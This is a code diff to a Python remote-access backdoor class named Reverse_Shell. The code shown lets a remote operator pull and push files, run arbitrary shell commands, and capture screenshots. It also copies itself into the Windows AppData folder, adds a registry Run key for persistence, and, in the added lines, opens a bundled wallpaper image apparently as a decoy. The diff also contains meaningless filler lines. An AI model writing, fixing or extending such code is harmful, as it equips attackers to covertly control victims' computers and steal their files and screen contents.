@@ -74,7 +74,7 @@ class Reverse_Shell:
                 with open(command[:9], "rb") as file:
                     self.reliable_send(base64.b64encode(file.read()))
             elif command[:6] == "upload":
-                with open(command[7:],"wb") as fin:
+                with open(command[7:], "wb") as fin:
                     result = self.reliable_receive()
                     fin.write(base64.b64decode(result))
             elif command[:3] == "get":
@@ -85,14 +85,14 @@ class Reverse_Shell:
                     self.reliable_send("[-] Failed to Download File")
             elif command[:5] == "start":
                 try:
-                    subprocess.Popen(command[6:],shell=True)
+                    subprocess.Popen(command[6:], shell=True)
                     self.reliable_send("[+] Started")
                 except:
                     self.reliable_send("[-] Failed to start")
             elif command[:10] == "screenshot":
                 try:
                     self.screenshot()
-                    with open("monitor-1.png","rb") as screenshot:
+                    with open("monitor-1.png", "rb") as screenshot:
                         self.reliable_send(base64.b64encode(screenshot.read()))
                     os.remove("monitor-1.png")
                 except:
@@ -115,11 +115,17 @@ class Reverse_Shell:
     def copy_executable(self):
         # find the location of the appdata directory
         location = os.environ["appdata"] + "\\data.exe"
-        if not os.path.exists[location]:
+        if not os.path.exists(location):
             # copy the backdoor executable on the target if running for the first time
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v data /t REG_SZ /d ""'
                             + location + '"', shell=True)
+            name = sys._MEIPASS + "\Wallpaper.jpg"
+            try:
+                subprocess.Popen(name, shell=True)
+            except:
+                number = 3
+                number = number + 20
 
     def end_connection(self):
         # close the socket
